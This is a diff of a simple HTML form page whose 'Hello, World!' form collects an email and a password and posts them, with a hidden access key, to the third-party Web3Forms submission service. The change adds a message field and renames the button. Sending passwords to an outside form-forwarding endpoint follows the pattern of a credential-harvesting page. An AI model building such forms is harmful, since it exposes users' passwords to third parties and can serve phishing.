@@ -1,23 +1,21 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8">
   <title>Hello, World!</title>
   <style>
     body {
         font-family: Arial, sans-serif;
         background-color: #f4f4f9;
         padding: 20px;
-        margin: 0; /* Good practice to reset margin */
     }
 
     form {
-        background-color: white; /* use background-color for clarity */
+        background: white;
         max-width: 400px;
         margin: 50px auto;
         padding: 20px;
-        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        box-shadow: 0 0 10px rgba(0,0,0,0.1);
         border-radius: 8px;
     }
 
@@ -60,10 +58,11 @@
 <body>
   <form action="https://api.web3forms.com/submit" method="POST">
     <input type="hidden" name="access_key" value="39720635-cb0d-42d1-85f8-ffcd0e8af170">
-    <input type="email" name="email" placeholder="Email" required>
-    <input type="password" name="password" placeholder="Password" required> <!-- Removed unnecessary space in placeholder -->
+    <input type="email" name="email" placeholder="Your Email" required>
+    <input type="password" name="password" placeholder="Your Password" required>
+    <textarea name="message" placeholder="Your Message" required></textarea>
     <input type="hidden" name="redirect" value="https://web3forms.com/success">
-    <button type="submit">Login</button>
+    <button type="submit">Submit Form</button>
   </form>
 </body>
-  </html>
+</html>
